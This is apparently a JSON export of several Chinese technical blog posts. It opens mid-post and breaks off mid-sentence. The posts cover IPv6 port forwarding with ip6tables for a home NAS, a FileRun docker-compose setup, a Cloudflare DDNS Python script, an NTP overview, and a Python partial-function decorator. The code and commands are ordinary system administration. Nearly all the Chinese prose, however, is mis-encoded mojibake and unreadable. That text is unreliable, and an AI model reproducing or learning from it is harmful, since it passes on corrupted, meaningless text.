è¯·æ±‚ã€‚åœ¨è·¯ç”±å™¨çš„é˜²ç«å¢™ç•Œé¢é…ç½®æµé‡è§„åˆ™ï¼Œå…è®¸ç›®æ ‡åœ°å€ä¸ºæœåŠ¡å™¨çš„ IP åœ°å€ï¼Œç«¯å£ä¸º 22/80/443 ç«¯å£çš„è¯·æ±‚ï¼šæˆ–è€…ç›´æ¥ä½¿ç”¨ ip6tables å‘½ä»¤é…ç½®è·¯ç”±å™¨çš„ iptablesï¼š123ip6tables -A zone_wan_forward -d 240e:17:ce8:fd00:7285:c2ff:fe38:2a56/128 -p tcp -m tcp --dport 22 -m comment --comment \"!fw3: Allow-v6-forward\" -j zone_lan_dest_ACCEPTip6tables -A zone_wan_forward -d 240e:17:ce8:fd00:7285:c2ff:fe38:2a56/128 -p tcp -m tcp --dport 80 -m comment --comment \"!fw3: Allow-v6-forward\" -j zone_lan_dest_ACCEPTip6tables -A zone_wan_forward -d 240e:17:ce8:fd00:7285:c2ff:fe38:2a56/128 -p tcp -m tcp --dport 443 -m comment --comment \"!fw3: Allow-v6-forward\" -j zone_lan_dest_ACCEPTç„¶åæœ¬åœ°å¼€ä¸ª HTTP æœåŠ¡å™¨ï¼Œå†å°è¯•è®¿é—®ä¸€ä¸‹ http://[240e:17:ce8:fd00:7285:c2ff:fe38:2a56]/ï¼Œå¦‚æœé¡ºåˆ©çš„è¯ï¼Œå°±å¯ä»¥è‡ªå·±åšç½‘ç«™äº†~æµ‹è¯•çš„æ—¶å€™é‡åˆ°äº†ä¸€ä¸ªå°æ’æ›²ï¼šæˆ‘åœ¨ NAS çš„ 6000 ç«¯å£ä¸Šéšæ‰‹éƒ¨ç½²äº†ä¸€ä¸ª HTTP æœåŠ¡å™¨ï¼Œä½†ç”¨æ‰‹æœºçš„ Chrome è®¿é—®çš„æ—¶å€™æŠ¥å‡ºäº† ERR_UNSAFE_PORT çš„é”™è¯¯ï¼Œæ‰å‘ç° Chrome è¿˜æœ‰è¿™ç§å¥‡æ€ªçš„ç«¯å£è®¿é—®é™åˆ¶â€¦å…·ä½“å¯è§è¿™ç¯‡æ–‡ç« ã€‚ æ–‡ä»¶æœåŠ¡å™¨æ–‡ä»¶æœåŠ¡å™¨çš„é€‰å‹ï¼Œæˆ‘ä½¿ç”¨äº† Nginx + FileRunï¼Œç”¨ Docker è¿›è¡Œæ‰˜ç®¡ã€‚Nginx æ˜¯ä¹‹å‰åœ¨å†…ç½‘æ­æœåŠ¡çš„æ—¶å€™å°±æ­å¥½çš„ï¼ŒFileRun æ˜¯ä¸€æ¬¾é•¿å¾—å’Œ Google Drive æœ‰ç‚¹åƒ~~ï¼ˆå“ªé‡Œåƒäº†ï¼‰~~çš„æ–‡ä»¶æœåŠ¡å™¨ï¼Œæ”¯æŒæ–‡ä»¶åˆ†äº«ã€å›¾ç‰‡/è§†é¢‘åœ¨çº¿é¢„è§ˆï¼Œè¿˜å¯ä»¥ä½¿ç”¨ Office Web/Google Docs åœ¨çº¿ç¼–è¾‘æ–‡ä»¶ã€‚å®ƒæ˜¯æ”¶è´¹è½¯ä»¶ï¼Œä¸è¿‡å…è´¹åŠŸèƒ½ä¹Ÿå¤Ÿç”¨ã€‚åŠŸèƒ½å¼ºå¤§ï¼Œé•¿å¾—åˆå¾ˆæ¼‚äº®ï¼Œå°±ç”¨å®ƒäº†~FileRun æ”¯æŒä½¿ç”¨ Docker éƒ¨ç½²ï¼Œæ–¹æ³•å¯è§å®˜æ–¹æ–‡æ¡£ã€‚å…¶ä¸­ï¼Œå®¹å™¨ä¸­çš„ /var/www/html ç›®å½•ä¼šå­˜æ”¾ FileRun é¦–æ¬¡å¯åŠ¨æ—¶ç”Ÿæˆçš„ PHP æ–‡ä»¶ï¼Œè€Œ /user-files ç›®å½•æ˜¯ FileRun ç¨‹åºè¿›è¡Œæ–‡ä»¶æ“ä½œçš„æ ¹ç›®å½•ã€‚åœ¨éƒ¨ç½²æ—¶ï¼Œæˆ‘çš„ NAS ä¸Šå·²ç»æœ‰ä¸€ä¸ª MySQL æœåŠ¡äº†ï¼Œä¸æƒ³å†å¦èµ·ä¸€ä¸ªï¼Œæ‰€ä»¥é€šè¿‡ external_link è®¾ç½®è®© FileRun å®¹å™¨ç›´æ¥è®¿é—®ç°æœ‰çš„ MySQL å®¹å™¨ï¼š1234567891011121314151617181920212223version: '2'services: web: image: afian/filerun environment: FR_DB_HOST: mysql FR_DB_PORT: 3306 FR_DB_NAME: filerun FR_DB_USER: filerun FR_DB_PASS: password APACHE_RUN_USER: www-data APACHE_RUN_USER_ID: 33 APACHE_RUN_GROUP: www-data APACHE_RUN_GROUP_ID: 33 network_mode: bridge external_links: - mysql ports: - \"8030:80\" volumes: - /data/filerun/html:/var/www/html - /mnt:/user-files restart: alwaysNginx é…ä¸ªåä»£ï¼ŒDNS é…ä¸€æ¡ AAAA è®°å½•ï¼Œacme.sh ç­¾ä¸ª HTTPS è¯ä¹¦ï¼Œè¿™äº›éƒ½ä¸ç»†è®²äº†ã€‚ç™»å½•æ—¶ï¼Œå‘ç° JS é‡Œæœ‰ä¸ªå¥‡æ€ªçš„ base_url æŒ‡å‘äº† localhost:8030ï¼Œå¯¼è‡´é¡µé¢è„šæœ¬ä¸èƒ½æ­£å¸¸å·¥ä½œã€‚æŸ¥åˆ°è¿™ä¸ªå¸–å­ï¼Œæ–°å»ºæ–‡ä»¶ /user-files/customizables/config.phpï¼Œå†™å…¥å¦‚ä¸‹å†…å®¹ï¼š1&lt;?php $config['url']['root'] = 'https://filerun.somedomain.com'; $_SERVER['HTTPS'] = 'on';?&gt;é‡å¯ä¹‹åå°±å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ã€‚æ¥å¼ å›¾æ„Ÿå—ä¸€ä¸‹ğŸ˜„Update @ 2019.2.26ï¼šNextcloud çœŸé¦™ ğŸŒš è¿˜å‰©ä¸‹ä¸€ä¸ªå°é—®é¢˜ï¼šDDNSè·¯ç”±å™¨é‡å¯æˆ–é‡æ–°æ‹¨å·åï¼ŒNAS ä¼šæ‹¿åˆ°æ–°çš„ IPï¼Œç½‘ç«™å°±æ— æ³•æ­£å¸¸è®¿é—®äº†ã€‚äºæ˜¯å†™äº†ä¸ªè„šæœ¬ç”¨ CloudFlare API æ›´æ”¹ DNS è®°å½•ï¼Œå¯ä»¥å®šæ—¶è¿è¡Œè„šæœ¬ï¼Œæ¥æ›´æ–° IP åœ°å€ã€‚12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env python3import socketimport requestsKEY = \"&lt;Cloudflare API Key&gt;\"EMAIL = \"&lt;Cloudflare Email&gt;\"ZONE_ID = \"&lt;Zone ID&gt;\"records = [[\"&lt;DNS Record ID&gt;\", \"&lt;Domain&gt;\"]]def get_ip_6(host, port=0): sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM) sock.connect((host, port)) return sock.getsockname()[0]def main(): ip = get_ip_6('ipv6.google.com') api_url = \"https://api.cloudflare.com/client/v4/zones/&#123;&#125;/dns_records/&#123;&#125;\" headers = &#123; \"X-Auth-Email\": EMAIL, \"X-Auth-Key\": KEY &#125; for record_id, domain in records: url = api_url.format(ZONE_ID, record_id) res = requests.put(url, json=&#123; \"type\": \"AAAA\", \"name\": domain, \"content\": ip, \"ttl\": 120, \"proxied\": False &#125;, headers=headers) print(res.status_code, res.json())if __name__ == '__main__': main()Ref: Finding local IP addresses using Pythonâ€™s stdlibå“¦å¯¹äº†ï¼ŒIP æ›´æ¢ä¹‹åï¼Œé™¤äº†æ›´æ–° DNS è®°å½•ï¼Œè¿˜è¦è®°å¾—é‡æ–°é…ç½®è·¯ç”±å™¨é˜²ç«å¢™ã€‚å·®ä¸å¤šå°±å†™è¿™äº›äº†ã€‚","categories":[{"name":"ç½‘ç»œ","slug":"ç½‘ç»œ","permalink":"https://blog.stdioa.com/categories/ç½‘ç»œ/"}],"tags":[{"name":"IPv6","slug":"IPv6","permalink":"https://blog.stdioa.com/tags/IPv6/"},{"name":"NAS","slug":"NAS","permalink":"https://blog.stdioa.com/tags/NAS/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.stdioa.com/tags/Linux/"}]},{"title":"NTP ç®€ä»‹","slug":"NTP-summary","date":"2019-02-12T11:50:00.000Z","updated":"2019-02-13T00:11:49.387Z","comments":true,"path":"2019/02/NTP-summary/","link":"","permalink":"https://blog.stdioa.com/2019/02/NTP-summary/","excerpt":"æ˜¨å¤©é‡åˆ°äº†ä¸€ä¸ªç¥å¥‡çš„é—®é¢˜ï¼Œæœ€åå‘ç°æ˜¯æœåŠ¡å™¨çš„ ntpd æ²¡å¼€å¯¼è‡´æœ¬åœ°æ—¶é—´æ²¡æœ‰åŒæ­¥ğŸ˜‚ æ­£å¥½äº†è§£ä¸€ä¸‹ NTP.","text":"æ˜¨å¤©é‡åˆ°äº†ä¸€ä¸ªç¥å¥‡çš„é—®é¢˜ï¼Œæœ€åå‘ç°æ˜¯æœåŠ¡å™¨çš„ ntpd æ²¡å¼€å¯¼è‡´æœ¬åœ°æ—¶é—´æ²¡æœ‰åŒæ­¥ğŸ˜‚ æ­£å¥½äº†è§£ä¸€ä¸‹ NTP. NTP åè®®NTP åè®®ç”¨äºåœ¨ç½‘ç»œä¹‹ä¸­é€šè¿‡åˆ†ç»„äº¤æ¢è¿›è¡Œæ—¶é’ŸåŒæ­¥ã€‚åŸºäº UDPï¼Œä½¿ç”¨ 123 ç«¯å£ã€‚ åè®®å®ç°å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨é—´ä¼šé€šè¿‡ä¿®æ”¹ç‰ˆçš„ Marzullo ç®—æ³• å®Œæˆæ—¶é—´åŒæ­¥ã€‚åœ¨ä¼ é€’æ—¶é—´æ—¶ï¼ŒæœåŠ¡å™¨ä¼šç»™å‡º 64 ä½çš„æ—¶é—´æˆ³ï¼Œæµ®ç‚¹ç²¾åº¦ä¸º 32 ä½ã€‚è¿™ä¸ªæ—¶é—´æˆ³æ¯ 2^32 ç§’ä¼šç¿»è½¬ä¸€æ¬¡ï¼Œç†è®ºåˆ†è¾¨ç‡ä¸º 2^-32 ç§’ã€‚æ—¶é—´æˆ³ä»¥ 1900 å¹´ 1 æœˆ 1 æ—¥ä½œä¸ºå¼€å§‹æ—¶é—´ã€‚NTP æ—¶é—´æºä¼šè¿›è¡Œåˆ†å±‚ï¼Œé€šè¿‡é˜¶å±‚ n åŒæ­¥çš„æœåŠ¡å™¨å°†è¿è¡Œåœ¨é˜¶å±‚ n+1. åˆ†å±‚æœºåˆ¶ç”¨æ¥é˜²æ­¢å¾ªç¯è¯·æ±‚ã€‚é˜¶å±‚ 0 çš„æœåŠ¡å™¨ä¸é«˜ç²¾åº¦è®¡æ—¶è®¾å¤‡ï¼ˆå¦‚åŸå­é’Ÿï¼‰ç›¸è¿ï¼Œä¹Ÿæˆä¸ºåŸºå‡†æ—¶é’Ÿã€‚ ä½¿ç”¨ NTP åŒæ­¥ Linux ç³»ç»Ÿæ—¶é—´ ntpdntpd æ˜¯æŸäº› Linux å‘è¡Œç‰ˆè‡ªå¸¦çš„ NTP åŒæ­¥å·¥å…·ï¼Œå®ƒé€šå¸¸åœ¨åå°è¿è¡Œï¼Œä¸æˆæ—¶æœåŠ¡å™¨è¿›è¡Œæ—¶é—´åŒæ­¥ã€‚ntpd é»˜è®¤ä½¿ç”¨ /etc/ntp.conf ä½œä¸ºé…ç½®æ–‡ä»¶ã€‚é…ç½®æ–¹æ³•åŠèŒƒä¾‹å¯ä»¥å‚è€ƒ Linux System Administrators Guideä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯åŠ¨ ntpd å¹¶ä¸ä¼šç«‹å³çº æ­£æœ¬åœ°æ—¶é—´ï¼Œè€Œæ˜¯ä¼šç¼“æ…¢åœ°è¿›è¡Œæ—¶é—´åŒæ­¥ã€‚Be patient! A simple test is to change your system clock by 10 minutes before you go to bed and then check it when you get up. The time should be correct. ntpdatentpdate æ˜¯ä¸€æ¬¾ä½¿ç”¨ NTP åè®®åŒæ­¥æœ¬åœ°æ—¶é—´çš„å·¥å…·ã€‚å¦‚æœéœ€è¦å¿«é€Ÿçº æ­£æ—¶é—´ï¼Œå¯ä»¥ä½¿ç”¨ ntpdate è¿›è¡Œæ‰‹åŠ¨åŒæ­¥ã€‚å®‰è£…ï¼š1apt install ntpdateä½¿ç”¨ï¼š12$ sudo ntpdate cn.ntp.org.cn12 Feb 13:19:05 ntpdate[27659]: adjust time server 119.28.183.184 offset -0.007086 secæ³¨æ„ï¼šç”±äº NTP åè®®ä½¿ç”¨å›ºå®šç«¯å£ï¼Œåœ¨ä½¿ç”¨ ntpdate æ—¶ï¼Œéœ€è¦å…³é—­ ntpd æœåŠ¡ã€‚ systemd-timesyncdsystemd-timesyncd æ˜¯ timedated æä¾›çš„æ—¶é’ŸåŒæ­¥å®ˆæŠ¤è½¯ä»¶ã€‚å®ƒå¯ä»¥é€šè¿‡ systemd-timesyncd.service æœåŠ¡å¯åŠ¨ã€‚timesyncd çš„é…ç½®æ–‡ä»¶ä½äº /etc/systemd/timesyncd.confï¼Œæ ¼å¼å¦‚ä¸‹ï¼š123456[Time]NTP=cn.ntp.org.cn 0.cn.pool.ntp.org # ä¸»è¦ NTP æœåŠ¡å™¨FallbackNTP=0.arch.pool.ntp.org 1.arch.pool.ntp.org 2.arch.pool.ntp.org 3.arch.pool.ntp.org # å¤‡ç”¨ NTP æœåŠ¡å™¨RootDistanceMaxSec=5PollIntervalMinSec=32PollIntervalMaxSec=2048é…ç½®å®Œæˆåï¼Œè¿è¡Œ sudo timedatectl set-ntp true å¯ç”¨æ—¶é—´åŒæ­¥æœåŠ¡ timedatectl status å¯ä»¥æŸ¥çœ‹å½“å‰åŒæ­¥è®¾ç½®ï¼Œtimedatectl timesync-status å¯ä»¥æŸ¥çœ‹å½“å‰æ—¶é—´åŒæ­¥æœåŠ¡çš„è¿è¡ŒçŠ¶æ€ï¼ŒåŒ…æ‹¬æ—¶é—´å»¶è¿Ÿã€è¯¯å·®ã€è‡³ä»ŠåŒæ­¥æ¬¡æ•°ç­‰ã€‚ å›½å†…å¸¸ç”¨çš„ NTP åœ°å€ï¼ˆIP æ± ï¼‰ntp.org.cnï¼šcn.ntp.org.cnNTP Pool Projectï¼š0.cn.pool.ntp.orgé˜¿é‡Œäº‘ NTPï¼štime.pool.aliyun.comæ›´å¤šåœ°å€å¯å‚è€ƒå›½å†…å¸¸ç”¨NTPæœåŠ¡å™¨åœ°å€ å…¶å®ƒå‚è€ƒæ–‡æ¡£https://wiki.archlinux.org/index.php/Systemd-timesyncd_(ç®€ä½“ä¸­æ–‡)https://zh.wikipedia.org/wiki/ç¶²è·¯æ™‚é–“å”å®šhttps://wiki.archlinux.org/index.php/Systemd-timesyncd_(ç®€ä½“ä¸­æ–‡)https://www.freedesktop.org/software/systemd/man/systemd-timesyncd.service.html","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.stdioa.com/tags/Linux/"},{"name":"NTP","slug":"NTP","permalink":"https://blog.stdioa.com/tags/NTP/"}]},{"title":"ã€Šæµç•…çš„ Pythonã€‹é˜…è¯»ç¬”è®°","slug":"fluent-python-notes","date":"2018-12-24T12:03:00.000Z","updated":"2018-12-24T14:19:42.403Z","comments":true,"path":"2018/12/fluent-python-notes/","link":"","permalink":"https://blog.stdioa.com/2018/12/fluent-python-notes/","excerpt":"å»å¹´å°±æƒ³çœ‹ã€Šæµç•…çš„ Pythonã€‹è¿™æœ¬ä¹¦ï¼Œä»Šå¹´ç»ˆäºçœ‹å®Œäº†ã€‚","text":"å»å¹´å°±æƒ³çœ‹ã€Šæµç•…çš„ Pythonã€‹è¿™æœ¬ä¹¦ï¼Œä»Šå¹´ç»ˆäºçœ‹å®Œäº†ã€‚ã€Šæµç•…çš„ Pythonã€‹æ˜¯ä¸€æœ¬æ·±å…¥è®²è§£ Python è¯­è¨€çš„ä¹¦ï¼Œéå¸¸å€¼å¾—ä¸€è¯»ã€‚å»å¹´çœ‹åˆ°åŒäº‹åœ¨çœ‹ï¼Œå°±ä¸€ç›´æƒ³çœ‹ï¼Œé™†é™†ç»­ç»­çœ‹äº†å¾ˆä¹…æ²¡ä»€ä¹ˆè¿›åº¦ï¼Œè¿™ä¸ªæœˆä¸€åŠªåŠ›ï¼ŒæŠŠè¿™æœ¬ä¹¦çœ‹å®Œäº†ã€‚è¿™æ¬¡è„‘æ´ä¸€å¼€ï¼Œè§‰å¾—æ—¢ç„¶å­¦çš„æ˜¯ Pythonï¼Œé‚£æˆ‘ä¸ºä»€ä¹ˆä¸ç”¨ Python åšç¬”è®°å‘¢ï¼Ÿäºæ˜¯å°±é€‰ç”¨äº† Jupyter Notebook æ¥åšç¬”è®°è½½ä½“ã€‚ä¸€ä¸ªæ–‡æ¡£é‡Œæ—¢å¯ä»¥å†™ Markdownï¼Œåˆå¯ä»¥è¿è¡Œ Python ä»£ç ï¼Œç®€ç›´å®Œç¾ã€‚æ‰€ä»¥ï¼Œè¿™æœ¬ä¹¦çš„ç¬”è®°å°±è¿™ä¹ˆå†™å‡ºæ¥äº†ã€‚å†…å®¹ä¸ç®—å°‘ï¼Œæ‰€ä»¥çƒ¦è¯·ç§»æ­¥æˆ‘çš„ GitHub Repo.","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/tags/Python/"},{"name":"è¯»ä¹¦","slug":"è¯»ä¹¦","permalink":"https://blog.stdioa.com/tags/è¯»ä¹¦/"}]},{"title":"Python Hacking: â€œé«˜çº§â€åå‡½æ•°","slug":"python-hacking-advanced-partial","date":"2018-12-02T02:06:00.000Z","updated":"2018-12-12T14:07:15.798Z","comments":true,"path":"2018/12/python-hacking-advanced-partial/","link":"","permalink":"https://blog.stdioa.com/2018/12/python-hacking-advanced-partial/","excerpt":"æœ¬æ–‡è®²è§£äº†ä¸€ä¸ªéœ€æ±‚çš„è§£å†³æ–¹æ¡ˆï¼Œè€Œè¿™ä¸ªå¥‡è‘©éœ€æ±‚ä½ åœ¨ 99.93% åœºæ™¯ä¸‹éƒ½ä¸ä¼šé‡åˆ°ï¼Œå°±ç®—é‡åˆ°äº†ï¼Œä¹Ÿä¸€å®šæœ‰å…¶å®ƒæ›´ç®€å•çš„è§£å†³æ–¹æ¡ˆã€‚","text":"æœ¬æ–‡è®²è§£äº†ä¸€ä¸ªéœ€æ±‚çš„è§£å†³æ–¹æ¡ˆï¼Œè€Œè¿™ä¸ªå¥‡è‘©éœ€æ±‚ä½ åœ¨ 99.93% åœºæ™¯ä¸‹éƒ½ä¸ä¼šé‡åˆ°ï¼Œå°±ç®—é‡åˆ°äº†ï¼Œä¹Ÿä¸€å®šæœ‰å…¶å®ƒæ›´ç®€å•çš„è§£å†³æ–¹æ¡ˆã€‚ 0. å¼•è¨€&gt;&gt;&gt; print((lambda x:None).__code__.__doc__)code(argcount, kwonlyargcount, nlocals, stacksize, flags, codestring,constants, names, varnames, filename, name, firstlineno,lnotab[, freevars[, cellvars]])Create a code object. Not for the faint of heart. 1. éœ€æ±‚mock.patch å¯¹è±¡åœ¨ç”¨åšè£…é¥°å™¨æ—¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ªåå‡½æ•°ï¼Œæ¥å°†åŸå§‹å‡½æ•°çš„ç¬¬ä¸€ä¸ªä½ç½®å‚æ•°è¦†ç›–ä¸ºä¸€ä¸ª mock å¯¹è±¡ï¼Œå¦‚ï¼š123@mock.patch('func')def test_something(mock, a, b): passæ­¤å¤„ mock å‚æ•°å°±æ˜¯ patch å¯¹åº”çš„ mock å¯¹è±¡ã€‚è€Œ pytest æœ‰ä¸€ä¸ªæœ‰ç‚¹å‰å®³çš„åŠŸèƒ½ï¼šå®ƒä¼šè¯»å–æµ‹è¯•å‡½æ•°çš„å‚æ•°ï¼Œå¹¶åœ¨ conftest.py ä¸­å¯»æ‰¾æ¯ä¸ªå‚æ•°å¯¹åº”çš„åŒå fixture å¹¶åŠ è½½ã€‚å‰ä¸¤å¤©å°±é‡åˆ°äº†è¿™æ ·çš„é—®é¢˜ï¼šæˆ‘è¦åšä¸€ä¸ªç±»ä¼¼ patch çš„è£…é¥°å™¨ï¼Œåœ¨ pytest æµ‹è¯•å‡½æ•°æ‰§è¡Œæ—¶å‘å†…éƒ¨æ³¨å…¥ä¸€ä¸ªå‚æ•°ï¼Œè€Œä¸”è¦ä¿è¯è¿™ä¸ªå‚æ•°åœ¨è¢« pytest è§£ææ—¶ä¸èƒ½æš´éœ²åœ¨å‚æ•°åˆ—è¡¨ä¸­ï¼Œå¦åˆ™ pytest ä¼šå› ä¸ºæ‰¾ä¸åˆ°å‚æ•°çš„ fixture è€ŒæŠ¥é”™ã€‚12345678@my_patch('func')def test_something(mock, fixa, fixb): # mock å‚æ•°ç”± @my_patch æ³¨å…¥ pass# åœ¨å¤–ç•Œçœ‹æ¥ï¼Œtest_something çš„å‚æ•°åªèƒ½æœ‰ fixa å’Œ fixbï¼Œè€Œä¸èƒ½æœ‰ mockimport inspectassert str(inspect.signature(test_something)) == \"(fixa, fixb)\" 2. é“ºå«ä¸€ä¸‹ï¼šç®€å•çš„åå‡½æ•°è£…é¥°å™¨å®ç°å¦‚æœæƒ³å®ç°ä¸€ä¸ªç®€å•çš„åå‡½æ•°è£…é¥°å™¨ï¼Œéå¸¸ç®€å•ï¼š1234567891011121314def my_partial(*partial_args, **partial_kwargs): def decorator(func): def wrapped(*args, **kwargs): args = partial_args + args partial_kwargs.update(kwargs) return func(*args, **partial_kwargs) return wrapped return decorator@my_partial(1, 2, d=5)def func(a, b, c, d=4): return sum([a, b, c, d])assert func(3) == 11ä½†è¿™æ ·çš„è¯ï¼Œfunc çš„å‚æ•°å£°æ˜å°†ä¼šå˜æˆ wrapped çš„å‚æ•°å£°æ˜ï¼Œä¹Ÿå°±æ˜¯ (*args, **kwargs)ï¼Œè€Œåœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œfunc çš„å‚æ•°å£°æ˜åº”è¯¥æ˜¯ (c, d=5)ï¼Œæ‰èƒ½å¤ŸçœŸæ­£æ»¡è¶³ pytest çš„è¦æ±‚ã€‚äºæ˜¯ï¼Œæˆ‘ä»¬å°±éœ€è¦åœ¨å®šä¹‰ wrapped å‡½æ•°çš„æ—¶å€™ï¼Œå¯¹å®ƒçš„å‚æ•°å£°æ˜è¿›è¡Œå®šåˆ¶åŒ–ã€‚ 3. æ¥ç‚¹åŸºç¡€çŸ¥è¯† 3.1 è·å–å‡½æ•°å‚æ•°å£°æ˜è·å–å®Œæ•´çš„å‡½æ•°å‚æ•°å£°æ˜ï¼Œè¦æ¶‰åŠåˆ°å‡½æ•°çš„å‡ ä¸ªç§æœ‰å±æ€§ï¼š__code__: ç¼–è¯‘è¿‡çš„å‡½æ•°ä»£ç å¯¹è±¡ï¼Œç±»å‹ä¸º types.CodeType__defaults__: å‡½æ•°çš„åºåˆ—å‚æ•°é»˜è®¤å€¼ï¼Œç±»å‹ä¸º None æˆ– tuple__kwdefaults__: å‡½æ•°çš„å…³é”®å­—å‚æ•°é»˜è®¤å€¼ï¼Œç±»å‹ä¸º None æˆ– dictå…¶ä¸­ code å¯¹è±¡ä¸­çš„å‡ ä¸ªå±æ€§ä¹Ÿéœ€è¦ç”¨åˆ°ï¼šco_varnames: å‡½æ•°å£°æ˜ä¸­æ‰€æœ‰å‚æ•°çš„å˜é‡åï¼Œå…¶ä¸­ * å’Œ ** å¯å˜å‚æ•°çš„å˜é‡åä¼šæ”¾åœ¨æœ€åco_argcount: åºåˆ—å‚æ•°çš„æ•°é‡co_kwonlyargcount: ä¸¥æ ¼å…³é”®è¯å‚æ•°çš„æ•°é‡co_flags: å‡½æ•°æ€§è´¨æ ‡è®°ï¼Œ0x04 ä½å£°æ˜è¿™ä¸ªå‡½æ•°æ˜¯å¦ç”¨åˆ°äº† *argsï¼Œè€Œ 0x08 ä½å£°æ˜è¿™ä¸ªå‡½æ•°æ˜¯å¦ç”¨åˆ°äº† **kwargsæœ‰äº†è¿™äº›å±æ€§ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å–åˆ°å‡½æ•°çš„å‚æ•°å£°æ˜ä¿¡æ¯ã€‚å…·ä½“å®ç°å¯ä»¥çœ‹ä¸‹é¢çš„ä»£ç æ±‡æ€»ã€‚å½“ç„¶ï¼ŒPython 3 è¿˜æ”¯æŒå‡½æ•°æ³¨è§£ï¼Œéœ€è¦ç”¨åˆ°å‡½æ•°çš„ __annotations__ å±æ€§ï¼Œä½†åœ¨æˆ‘çš„ä»£ç ä¸­æ²¡æœ‰å¯¹è¿™éƒ¨åˆ†è¿›è¡Œè§£æã€‚ 3.2 inspect åº“å½“ç„¶ï¼Œè¿™äº›è½®å­ï¼ŒPython è‡ªå¸¦åº“ inspect éƒ½å·²ç»å¸®æˆ‘ä»¬é€ å¥½äº†ã€‚inspect.getfullargspec(f) å¯ä»¥è·å–åˆ°ä»¥ä¸Šæ‰€æœ‰çš„å‚æ•°ä¿¡æ¯ï¼š123456&gt;&gt;&gt; def func(a, b=1, *args, c=2, **kwargs):... pass...&gt;&gt;&gt; inspect.getfullargspec(func)FullArgSpec(args=['a', 'b'], varargs='args', varkw='kwargs', defaults=(1,), kwonlyargs=['c'], kwonlydefaults=&#123;'c': 2&#125;, annotations=&#123;&#125;)è€Œ inspect.signature æ›´åŠ å¼ºå¤§ï¼Œå®ƒé™¤äº†è§£æå‡½æ•°å¤–ï¼Œè¿˜æ”¯æŒâ€œæ¨¡æ‹Ÿè°ƒç”¨â€å‡½æ•°ï¼Œå¯¹è°ƒç”¨æ–¹å¼è¿›è¡Œåˆæ³•æ€§éªŒè¯ï¼Œå¹¶å±•ç¤ºè°ƒç”¨ä¹‹åå‡½æ•°ä¸­æ¯ä¸ªå‚æ•°çš„å€¼ï¼š123456789&gt;&gt;&gt; s = inspect.signature(func) # func å®šä¹‰è§ä¸Š&gt;&gt;&gt; s&lt;Signature (a, b=1, *args, c=2, **kwargs)&gt;&gt;&gt;&gt; b = s.bind(0)&gt;&gt;&gt; b&lt;BoundArguments (a=0)&gt;&gt;&gt;&gt; b.apply_defaults()&gt;&gt;&gt; b&lt;BoundArguments (a=0, b=1, args=(), c=2, kwargs=&#123;&#125;)&gt;å®ç°äº†è¿™äº›åŠŸèƒ½ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹ç»™å®šå‡½æ•°è¿›è¡Œå‚æ•°è§£æå¹¶ä¿®æ”¹äº†ã€‚è¿™éƒ½ç®—å“ªé—¨å­åŸºç¡€çŸ¥è¯†å˜›â€¦ 4. å¼€å§‹åŠ¨æ‰‹å…ˆæ¥å†™ä¸€ä¸ªç®€å•çš„ã€åªæ”¯æŒåºåˆ—å‚æ•°ï¼Œä¸”ä¸æ”¯æŒå‚æ•°é»˜è®¤å€¼çš„åå‡½æ•°å®ç°ã€‚12345678910def func(a, b, c): return sum([a, b, c])if __name__ == '__main__': print(func(1, 2, 3,), func, signature(func)) # 6 &lt;function func at 0x02D23B28&gt; (a, b, c) partial = nb_partial(3, 4)(func) # æˆ‘æ˜¯ä¸ªè£…é¥°å™¨ï¼Œç›¸ä¿¡ä½ çœ‹å¾—æ‡‚ print(partial(5), partial, signature(partial, follow_wrapped=False)) # 12 &lt;function func at 0x02DA0DB0&gt; (c)æ³¨ï¼šsigature(follow_wrapped=False) ä¼šæ”¹å˜ signature çš„é»˜è®¤è¡Œä¸ºï¼šåªæŸ¥çœ‹å‡½æ•°æœ¬èº«çš„å®šä¹‰ï¼Œè€Œä¸ä¼šé€šè¿‡ __wrapped__ é“¾å»æŸ¥æ‰¾åŸå‡½æ•°ã€‚ 4.1 å¤§ä½“æ¡†æ¶æ­ä¸ªæ¶å­ï¼š12345678910111213141516171819from functools import wrapsdef nb_partial(func, *partial_args): pre_arg_str = ', '.join(map(repr, partial_args)) # è¿™é‡Œæ˜¯æ‰€æœ‰é¢„å®šä¹‰å‡½æ•°çš„å€¼ï¼ˆ\"3, 4\"ï¼‰ code = func.__code__ if len(partial_args) &gt; code.co_argcount: raise TypeError(\"Too many positional arguments\") args = code.co_varnames[:code.co_argcount] post_args = args[len(partial_args):] post_args_str = ', '.join(post_args) # è¿™é‡Œæ˜¯æ’é™¤é¢„å®šä¹‰å‡½æ•°åï¼Œå‰©ä¸‹çš„å‚æ•°ååˆ—è¡¨ï¼ˆ\"c\"ï¼‰ def wrapped(c): # To be implemented return func(3, 4, c) return wraps(func)(wrapped)ç°åœ¨æˆ‘ä»¬æœ‰äº†éœ€è¦çš„å˜é‡å€¼å’Œå˜é‡åä¿¡æ¯ã€‚å¯æ˜¯ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ ¹æ®è¿™äº›å˜é‡ä¿¡æ¯åŠ¨æ€å®šä¹‰ wrapped å‡½æ•°ï¼Œè¿™ä¸ªå°±æœ‰ç‚¹éº»çƒ¦äº†â€¦ 4.2 é»‘ç§‘æŠ€ï¼šcode object &amp; FunctionTypePython æ¯•ç«Ÿæ˜¯â€œä¸‡ç‰©çš†å¯¹è±¡â€çš„åŠ¨æ€è¯­è¨€ã€‚ä»å­—ç¬¦ä¸²ç¼–è¯‘ä¸€æ®µä»£ç 